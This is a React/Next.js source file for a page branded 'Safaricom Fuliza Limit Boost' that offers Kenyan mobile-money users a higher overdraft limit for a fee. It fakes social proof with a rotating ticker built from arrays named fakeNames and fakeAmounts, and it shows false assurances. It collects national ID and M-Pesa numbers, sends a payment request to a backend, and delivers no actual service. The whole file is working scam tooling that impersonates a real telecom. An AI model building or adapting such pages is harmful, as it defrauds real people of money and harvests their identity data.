"use client";

import React, { useEffect, useState } from "react";

type Limit = {
  id: string;
  amount: number;
  fee: number;
};

const limits: Limit[] = [
  { id: "l1", amount: 5000, fee: 150 },
  { id: "l2", amount: 7500, fee: 180 },
  { id: "l3", amount: 10000, fee: 200 },
  { id: "l4", amount: 15000, fee: 250 },
  { id: "l5", amount: 20000, fee: 300 },
  { id: "l6", amount: 30000, fee: 400 },
  { id: "l7", amount: 40000, fee: 540 },
  { id: "l8", amount: 50000, fee: 960 },
];

const fakeNames = ["James K.", "Mercy W.", "Brian O.", "Faith N.", "Allan M."];
const fakeAmounts = [15000, 20000, 34000, 50000, 25000];

export default function FulizaBoost() {
  const [selectedLimit, setSelectedLimit] = useState<Limit | null>(null);
  const [showModal, setShowModal] = useState(false);
  const [loading, setLoading] = useState(false);
  const [success, setSuccess] = useState(false);
  const [phone, setPhone] = useState("");
  const [idNumber, setIdNumber] = useState("");
  const [recent, setRecent] = useState({ name: "", amount: 0 });

  useEffect(() => {
    const generate = () => {
      const name = fakeNames[Math.floor(Math.random() * fakeNames.length)];
      const amount = fakeAmounts[Math.floor(Math.random() * fakeAmounts.length)];
      setRecent({ name, amount });
    };
    generate();
    const interval = setInterval(generate, 2000);
    return () => clearInterval(interval);
  }, []);

  const handleBuy = async () => {
    if (!selectedLimit || !phone || !idNumber) return;
    setLoading(true);

    const BACKEND_URL =
      process.env.NEXT_PUBLIC_BACKEND_URL || "http://localhost:5000";

    try {
      const res = await fetch(`${BACKEND_URL}/api/runPrompt`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          phone,
          amount: selectedLimit.fee,
          local_id: `O${Date.now().toString(36)}`,
          transaction_desc: `Fuliza boost to Ksh ${selectedLimit.amount}`,
        }),
      });

      const data = await res.json();
      if (data.status) setSuccess(true);
    } catch (err) {
      console.log(err);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-[#f4faf6] flex justify-center">
      <div className="w-full max-w-md pb-16">

        {/* Header */}
        <div className="bg-[#00A651] text-white text-center py-5 font-semibold text-lg shadow">
          Safaricom Fuliza Limit Boost
        </div>

        {/* Subtitle */}
        <div className="text-center mt-5 px-6">
          <h2 className="text-xl font-bold text-[#008043]">
            Increase Your Fuliza Allocation
          </h2>
          <p className="text-sm text-gray-600 mt-1">
            Secure digital application process for eligible Safaricom customers.
          </p>
        </div>

        {/* Trust Features Card */}
        <div className="mx-4 mt-6 bg-white rounded-2xl shadow-md p-4 border border-green-100">
          <div className="flex justify-between text-sm font-medium text-[#008043]">
            <span>✔ Secure Application</span>
            <span>✔ No CRB Check</span>
          </div>
          <div className="text-center text-sm font-medium text-[#008043] mt-2">
            ✔ Instant Approval
          </div>
        </div>

        {/* Live Activity */}
        <div className="mx-4 mt-5 bg-green-50 border border-green-200 p-3 rounded-xl text-sm text-gray-700">
          {recent.name} increased Fuliza to{" "}
          <span className="font-semibold text-[#008043]">
            Ksh {recent.amount.toLocaleString()}
          </span>{" "}
          • just now
        </div>

        {/* Section */}
        <div className="mx-4 mt-6 text-[#008043] font-semibold text-sm">
          Select Preferred Fuliza Limit
        </div>

        {/* Cards */}
        <div className="grid grid-cols-2 gap-4 px-4 mt-4">
          {limits.map((limit) => (
            <div
              key={limit.id}
              onClick={() => setSelectedLimit(limit)}
              className={`rounded-2xl p-4 cursor-pointer transition-all duration-300 shadow-sm hover:shadow-lg ${
                selectedLimit?.id === limit.id
                  ? "bg-[#00A651] text-white"
                  : "bg-white border border-green-200"
              }`}
            >
              <div className="font-semibold text-center">
                Ksh {limit.amount.toLocaleString()}
              </div>
              <div className="text-xs text-center opacity-80 mt-1">
                Service Fee: Ksh {limit.fee}
              </div>
            </div>
          ))}
        </div>

        {/* Button */}
        <div className="px-4 mt-6">
          <button
            onClick={() => selectedLimit && setShowModal(true)}
            className="w-full bg-[#00A651] hover:bg-[#008043] text-white py-3 rounded-xl font-semibold shadow"
          >
            Proceed Securely
          </button>
        </div>

        {/* Legal */}
        <div className="text-center text-xs text-gray-500 mt-6 px-6">
          This is a digital facilitation service for Safaricom Fuliza users.
          Processing timelines may vary based on eligibility criteria.
        </div>

        {/* Modal */}
        {showModal && selectedLimit && (
          <div className="fixed inset-0 bg-black/40 flex items-center justify-center px-4">
            <div className="bg-white w-full max-w-sm rounded-2xl p-6 shadow-2xl">

              {!success ? (
                <>
                  <div className="text-center mb-5">
                    <h3 className="text-lg font-semibold text-[#008043]">
                      Your Fuliza limit will be boosted to
                    </h3>
                    <p className="text-xl font-bold text-[#00A651] mt-1">
                      Ksh {selectedLimit.amount.toLocaleString()}
                    </p>
                  </div>

                  <input
                    type="text"
                    placeholder="National ID Number"
                    value={idNumber}
                    onChange={(e) => setIdNumber(e.target.value)}
                    className="w-full bg-gray-50 border border-gray-300 focus:border-green-500 focus:ring-2 focus:ring-green-200 transition rounded-xl p-3 mb-3 text-sm outline-none"
                  />

                  <input
                    type="tel"
                    placeholder="Safaricom M-Pesa Number"
                    value={phone}
                    onChange={(e) => setPhone(e.target.value)}
                    className="w-full bg-gray-50 border border-gray-300 focus:border-green-500 focus:ring-2 focus:ring-green-200 transition rounded-xl p-3 mb-4 text-sm outline-none"
                  />

                  <button
                    onClick={handleBuy}
                    disabled={loading}
                    className="w-full bg-[#00A651] text-white py-3 rounded-xl font-semibold"
                  >
                    {loading
                      ? "Processing Secure Payment..."
                      : `Pay Ksh ${selectedLimit.fee}`}
                  </button>
                </>
              ) : (
                <div className="text-center">
                  <h3 className="text-lg font-semibold text-[#008043]">
                    Application Submitted
                  </h3>
                  <p className="text-sm text-gray-600 mt-2">
                    Your request is under review.
                    Fuliza limit adjustment may take up to 72 hours.
                  </p>
                </div>
              )}
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
